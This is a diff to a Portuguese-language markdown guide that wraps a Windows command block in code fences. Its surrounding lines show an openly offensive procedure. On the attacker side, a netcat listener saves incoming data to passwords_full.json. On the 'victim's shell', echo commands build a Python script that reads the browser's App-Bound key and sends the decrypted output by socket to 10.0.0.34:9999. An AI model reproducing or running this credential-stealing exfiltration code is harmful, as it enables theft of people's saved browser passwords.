@@ -268,6 +268,7 @@ python -c "import os, sqlite3, shutil, tempfile, socket; login_data = os.environ
 nc -lvnp 9999 | tee passwords_full.json
 ```
 ### No shell da vitima
+``` cmd
 echo import os, sqlite3, shutil, tempfile, socket, subprocess, json, base64 > %TEMP%\final_v2.py
 echo. >> %TEMP%\final_v2.py
 echo # Lê a chave App-Bound do Local State >> %TEMP%\final_v2.py
@@ -308,6 +309,7 @@ echo     s.connect(('10.0.0.34', 9999)); s.send(result.encode()); s.close() >> %
 echo     print('ENVIADO!') >> %TEMP%\final_v2.py
 echo except Exception as e: >> %TEMP%\final_v2.py
 echo     print(f'Erro envio: {e}') >> %TEMP%\final_v2.py
+```
 
 ### Depois rode na vitima
 ``` cmd
